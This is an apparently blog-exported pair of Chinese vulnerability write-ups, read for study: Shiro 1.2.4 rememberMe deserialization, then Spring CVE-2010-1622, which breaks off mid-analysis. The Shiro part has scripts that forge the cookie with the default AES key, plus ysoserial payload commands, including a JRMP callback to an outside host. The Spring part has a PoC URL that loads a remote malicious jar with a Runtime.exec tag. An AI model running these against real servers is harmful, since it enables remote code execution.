<p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212650537.png" alt="image-20200321212650537"></p>
<p>这里可知前文中</p>
<blockquote>
<p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity103行将用户身份转换为byte[]</p>
</blockquote>
<p>的byte[]即为<code>随机16字节IV+AES密文</code></p>
<p>跟进this.rememberSerializedIdentity</p>
<p>org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321213458543.png" alt="image-20200321213458543"></p>
<p>其中将前文的<code>随机16字节IV+AES密文</code>byte[]进行了base64编码，并且最后设置成键为rememberMe的Cookie</p>
<p>可以验证一下确实如此</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321214045866.png" alt="image-20200321214045866"></p>
<h3 id="解密、反序列化过程"><a href="#解密、反序列化过程" class="headerlink" title="解密、反序列化过程"></a>解密、反序列化过程</h3><p>在org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity打下断点，然后从cookie中删除JSESSIONID只保留rememberMe刷新网页，或者发送只有rememberMe的请求</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321220720903.png" alt="image-20200321220720903"></p>
<p>cookie等信息都在subjectContext对象中，跟入rmm.getRememberedPrincipals</p>
<p>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221012855.png" alt="image-20200321221012855"></p>
<p>跟入this.getRememberedSerializedIdentity</p>
<p>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221502601.png" alt="image-20200321221502601"></p>
<p>在其中提取了cookie并进行base64解码</p>
<p>回到getRememberedPrincipals并跟入this.convertBytesToPrincipals</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221616027.png" alt="image-20200321221616027"></p>
<p>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221705778.png" alt="image-20200321221705778"></p>
<p>在137行进行AES解密，跟入的话，其实就是提取前16位作为iv，然后前文的默认key来进行解密</p>
<p>140行则进行反序列化</p>
<p>org.apache.shiro.io.DefaultSerializer#deserialize</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321222156614.png" alt="image-20200321222156614"></p>
<p>看到readObject便就结束了</p>
<h3 id="cookie解密及伪造脚本"><a href="#cookie解密及伪造脚本" class="headerlink" title="cookie解密及伪造脚本"></a>cookie解密及伪造脚本</h3><h4 id="cookie解密"><a href="#cookie解密" class="headerlink" title="cookie解密"></a>cookie解密</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode =  AES.MODE_CBC</span><br><span class="line">IV   = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line"><span class="built_in">print</span>(encryptor.decrypt(base64.b64decode(sys.argv[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure>

<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321224754536.png" alt="image-20200321224754536"></p>
<p>可以看到从第二行开始就是SimplePrincipalCollection对象的序列化数据</p>
<p>但脚本中并未使用真正的IV，而是一个错误值，其实在AES CBC解密中IV只会用于对第一个块进行解密，其他块的解密则是使用上一块的加密二进制作为IV进行解密操作，加密的时候，IV会影响所有数据的加密结果，而解密时，IV只会影响第一个加密块的解密结果</p>
<p>而cookie中的第一段是加密时所用的IV，所以在这里解错并无影响，下文构造cookie时也是由自己随意构造IV就可</p>
<h4 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="cookie伪造"></a>cookie伪造</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode =  AES.MODE_CBC</span><br><span class="line">IV   = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, IV)</span><br><span class="line"></span><br><span class="line">payload=base64.b64decode(sys.argv[<span class="number">1</span>])</span><br><span class="line">BS   = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">payload=pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(IV + encryptor.encrypt(payload)))</span><br></pre></td></tr></table></figure>

<p>IV随机生成，序列化的payload用base64格式传入</p>
<p>生成payload（<a href="https://www.cnblogs.com/lykm02/p/4479098.html">sed去除换行符</a>）</p>
<p><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s/\n//;b label&#39; </code></p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235149421.png" alt="image-20200321235149421"></p>
<p>伪造cookie</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235309952.png" alt="image-20200321235309952"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="DNS-gadget验证漏洞"><a href="#DNS-gadget验证漏洞" class="headerlink" title="DNS gadget验证漏洞"></a>DNS gadget验证漏洞</h3><p>在不知服务器含有哪些组件或者说不知道有哪些可用利用链时，可以ysoserial的URLDNS gadget进行漏洞验证，参数改成dns地址，测试能收到DNS请求。不过Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。URLDNS gadget不需要其他类的支持，它的Gadget Chain：</p>
<blockquote>
<p>*   Gadget Chain:<br>*     HashMap.readObject()<br>*       HashMap.putVal()<br>*         HashMap.hash()<br>*           URL.hashCode()</p>
</blockquote>
<p><code>java -jar ysoserial-master-30099844c6-1.jar URLDNS &quot;http://dx7yuq.dnslog.cn&quot; |base64 |sed &#39;:label;N;s/\n//;b label&#39;</code></p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000638321.png" alt="image-20200322000638321"></p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000820672.png" alt="image-20200322000820672"></p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000851697.png" alt="image-20200322000851697"></p>
<h3 id="commons-collections4"><a href="#commons-collections4" class="headerlink" title="commons-collections4"></a>commons-collections4</h3><p>由于前文搭建环境时已经添加了commons-collections4，所以利用ysoserial的CommonsCollections2即可</p>
<p><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s/\n//;b label&#39; </code></p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235751863.png" alt="image-20200321235751863"></p>
<h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><p>运行<code>mvn dependency:list</code>可以查看所有依赖</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322003851696.png" alt="image-20200322003851696"></p>
<p>其中就有commons-collections3.2.1</p>
<p>直接用ysoserial生成payload攻击会出错，原因是</p>
<blockquote>
<p>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
</blockquote>
<blockquote>
<h2 id="What-made-the-ysoserial-payloads-fail"><a href="#What-made-the-ysoserial-payloads-fail" class="headerlink" title="What made the ysoserial payloads fail?"></a><a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">What made the ysoserial payloads fail?</a></h2><p>I set up a test environment based on Apache Shiro samples and triggered the ysoserial payloads. Investigating the resulting errors reveals that Shiro uses a buggy classloader that is <strong>unable to deserialize any arrays</strong>. Unfortunately, most ysoserial payloads do contain an array of some sort:</p>
<ul>
<li>ChainedTransformer - the chain of transformers inside this object is an array, thus we cannot use ChainedTransformer at all</li>
<li>InvokerTransformer - the list of arguments given to the function is an array and will fail deserialiation. However, if we give no arguments, (de)serialization succeeds.</li>
</ul>
<p>The remaining payloads in ysoserial depend on classes that were not present in our target system :&#x2F; So looks like we cannot give parameters to method calls nor chain method calls to one another. Is all hope of succesful exploitation lost?</p>
</blockquote>
<p>解决这种问题的办法是使用JRMP</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322012002559.png" alt="image-20200322012002559"></p>
<p>我本地测试也未成功，参考其他师傅文章</p>
<blockquote>
<p>具体原因是打包成war的时候只会把compile和runtime的打包，而test的属于开发阶段需要使用的，从而不会打进去，而这里common-conllectons恰好属于test。所以生成环境中根本没有common-conllectons，因此是不可能打成功的。</p>
</blockquote>
<p>第一次攻击commons-collections3.2.1失败的原因应该就是直接出在maven scope上，因为commons-collections3.2.1的scope是test，编译运行时根本不存在</p>
<p>那现在手动加入commons-collections3.2.1，就会覆盖其父配置，让scope不为test</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>继续尝试使用JRMP的方法攻击</p>
<p><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient &quot;x.x.x.x:12345&quot;|base64 |sed &#39;:label;N;s/\n//;b label&#39;</code></p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322135132673.png" alt="image-20200322135132673"></p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133230697.png" alt="image-20200322133230697"></p>
<p>服务器开启监听并发送payload</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133300379.png" alt="image-20200322133300379"></p>
<p>这次确实成功执行命令</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133333045.png" alt="image-20200322133333045"></p>
<p>那么再尝试直接用CommonsCollections5 gadget</p>
<p><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 &quot;calc&quot; |base64 |sed &#39;:label;N;s/\n//;b label&#39;</code></p>
<p>失败，这次失败的原因才是如上文</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/WUXIAOCHANG/p/10886534.html">权限框架之Shiro详解</a></p>
<p><a href="http://saucer-man.com/information_security/396.html">分析调试apache shiro反序列化漏洞(CVE-2016-4437)</a></p>
<p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4">【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞</a></p>
<p><a href="https://issues.apache.org/jira/browse/SHIRO-550">[SHIRO-550] Randomize default remember me cipher - ASF JIRA</a></p>
<p><a href="https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html">Apache Shiro Java反序列化漏洞分析</a></p>
<p><a href="https://www.jianshu.com/p/45848dd484a9">关于AES加解密中CBC模式的IV初始化向量的安全性问题</a></p>
<p><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">Pwn a CTF Platform with Java JRMP Gadget</a></p>
<p><a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">Exploiting JVM deserialization vulns despite a broken class loader</a></p>
<p><a href="https://blog.zsxsoft.com/post/35">强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考</a></p>
<p><a href="http://redteam.today/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">shiro 反序列化复现</a></p>
]]></content>
      <tags>
        <tag>Java反序列化漏洞</tag>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Framework 代码执行(CVE-2010-1622)</title>
    <url>/2022/07/21/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/</url>
    <content><![CDATA[<p>Spring Framework 通过内省实现了参数绑定，可以将HTTP请求中的请求参数或者请求体内容，根据 Controller方法的参数，自动完成类型转换和赋值，导致可以覆盖classLoader中的属性，通过修改Tomcat WebappClassLoader 中的 repositoryURLs 让应用程序加载自定义jar包从而造成代码执行漏洞。</p>
<span id="more"></span>

<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
<li>Spring Framework<ul>
<li>&gt;&#x3D; 2.5.0, &lt;&#x3D; 2.5.6</li>
<li>&gt;&#x3D; 3.0.0, &lt;&#x3D; 3.0.2</li>
</ul>
</li>
<li>Tomcat <ul>
<li>&lt; 6.0.28</li>
</ul>
</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/l3yx/vuln-debug.git</span><br><span class="line"><span class="built_in">cd</span> vuln-debug/spring-framework/CVE-2010-1622</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>Web服务：<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></p>
<p>远程调试：127.0.0.1:5005</p>
<p>源码在vuln-debug&#x2F;spring-framework&#x2F;CVE-2010-1622&#x2F;code目录，使用IDEA远程调试。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>构造如下结构的Jar包并通过Web服务开放下载，可以使用zip或jar命令打包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jar cf sp-exp.jar *</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip -q -r sp-exp.jar *</span><br></pre></td></tr></table></figure>

<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220721223847329.png" alt="image-20220721223847329"></p>
<p>其中spring-form.tld和InputTag.tag的内容分别为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">taglib</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd&quot;</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Spring Framework JSP Form Tag Library<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tlib-version</span>&gt;</span>3.0<span class="tag">&lt;/<span class="name">tlib-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">short-name</span>&gt;</span>form<span class="tag">&lt;/<span class="name">short-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uri</span>&gt;</span>http://www.springframework.org/tags/form<span class="tag">&lt;/<span class="name">uri</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tag-file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>input<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>/META-INF/tags/InputTag.tag<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tag-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tag-file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>form<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>/META-INF/tags/InputTag.tag<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tag-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ tag dynamic-attributes=<span class="string">&quot;dynattrs&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    java.lang.Runtime.getRuntime().exec(<span class="string">&quot;touch /tmp/success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<p>环境启动后，直接携带POC访问 <a href="http://127.0.0.1:8080/test?class.classLoader.URLs%5B0%5D=jar:http://ip:8000/sp-exp.jar!/">http://127.0.0.1:8080/test?class.classLoader.URLs[0]&#x3D;jar:http://ip:8000/sp-exp.jar!&#x2F;</a>，如果在此之前访问了 <a href="http://127.0.0.1:8080/test">http://127.0.0.1:8080/test</a> 将不会触发后续流程。</p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220721224310413.png" alt="image-20220721224310413"></p>
<p>如上环境，Controller：</p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220721231524668.png" alt="image-20220721231524668"></p>
<p>test.jsp:</p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220721231554326.png" alt="image-20220721231554326"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="Java内省"><a href="#Java内省" class="headerlink" title="Java内省"></a>Java内省</h3><p>针对 Java Bean，在运行时可以获取如属性、方法和事件等相应的信息进行一些处理，这就是 Java Bean 的内省机制，其实就是对反射的一种封装。</p>
<p>Java Bean 内省机制的核心类是 <code>Introspector</code>，有两种常用方法来获取 Java Bean 的信息。</p>
<ul>
<li><code>getBeanInfo(Class&lt;?&gt; beanClass)</code></li>
<li><code>getBeanInfo(Class&lt;?&gt; beanClass, Class&lt;?&gt; stopClass)</code></li>
</ul>
<p>例如通过内省获取User类的属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IntrospectionException &#123;</span><br><span class="line">    <span class="type">BeanInfo</span> <span class="variable">userBeanInfo</span> <span class="operator">=</span> Introspector.getBeanInfo(User.class,Object.class);</span><br><span class="line">    PropertyDescriptor[] propertyDescriptors = userBeanInfo.getPropertyDescriptors();</span><br><span class="line">    <span class="keyword">for</span> (PropertyDescriptor propertyDescriptor : propertyDescriptors) &#123;</span><br><span class="line">        System.out.println(propertyDescriptor.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    userBeanInfo = Introspector.getBeanInfo(User.class);</span><br><span class="line">    propertyDescriptors = userBeanInfo.getPropertyDescriptors();</span><br><span class="line">    <span class="keyword">for</span> (PropertyDescriptor propertyDescriptor : propertyDescriptors) &#123;</span><br><span class="line">        System.out.println(propertyDescriptor.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>age<br>name</p>
<p>age<br>class<br>name</p>
</blockquote>
<p>没有使用<code>stopClass</code>的情况下会使得访问该类的同时访问到<code>Object.class</code>。因为在java中所有的对象都会默认继承Object基础类。而又因为它存在一个<code>getClass()</code>方法（只要有 getter&#x2F;setter 方法中的其中一个，那么 Java 的内省机制就会认为存在一个属性），所以会找到class属性。</p>
<h3 id="Spring-MVC参数绑定"><a href="#Spring-MVC参数绑定" class="headerlink" title="Spring MVC参数绑定"></a>Spring MVC参数绑定</h3><p>Spring MVC支持将HTTP请求中的的请求参数或者请求体内容，根据<code>Controller</code>方法的参数，自动完成类型转换和赋值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Pet pet;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Pet <span class="title function_">getPet</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> pet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPet</span><span class="params">(Pet pet)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.pet = pet;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String children[]= <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;1&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getChildren() &#123;</span><br><span class="line">        <span class="keyword">return</span> children;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220722215431376.png" alt="image-20220722215431376"></p>
<p><code>pet.name=test</code>说明 Spring MVC 支持多层嵌套的参数绑定，<code>pet.age=10</code>没有成功赋值是因为没有相应的set方法，但<code>children</code>没有相应的set方法也可以成功赋值。</p>
<h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h3><p>在<code>org.springframework.beans.AbstractPropertyAccessor#setPropertyValues(org.springframework.beans.PropertyValues, boolean, boolean)</code>下断点，请求<code>/test?class.classLoader.URLs[0]=jar:http://docker.for.mac.host.internal:8000/sp-exp.jar!/&#39;</code></p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220722220439235.png" alt="image-20220722220439235"></p>
<p>一直跟到设置<code>URLs[0]</code>的地方：</p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220722220655060.png" alt="image-20220722220655060"></p>
<p>是从<code>cachedIntrospectionResults</code>中获取PropertyDescriptor。</p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220722220810463.png" alt="image-20220722220810463"></p>
<p>发现其实就是封装了内省的操作。</p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220722221131757.png" alt="image-20220722221131757"></p>
<p>在最后赋值的时候<code>org.springframework.beans.BeanWrapperImpl#setPropertyValue(org.springframework.beans.BeanWrapperImpl.PropertyTokenHolder, org.springframework.beans.PropertyValue)</code>，判断类型是Array时会直接调用<code>Array.set</code>，由此绕过了set方法，直接调用底层赋值。后面同样List，Map类型的字段也有类似的处理，也就是说这三种类型是不需要set方法的。</p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220722221753837.png" alt="image-20220722221753837"></p>
<p>而一般的值，最终是在<code>org.springframework.beans.BeanWrapperImpl#setPropertyValue(org.springframework.beans.BeanWrapperImpl.PropertyTokenHolder, org.springframework.beans.PropertyValue)</code></p>
<p>通过内省赋值。</p>
<p><img src="/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220722222933684.png" alt="image-20220722222933684"></p>
<p>完成参数绑定后<code>repositoryURLs[0]</code>变成我们输入的值：</p>
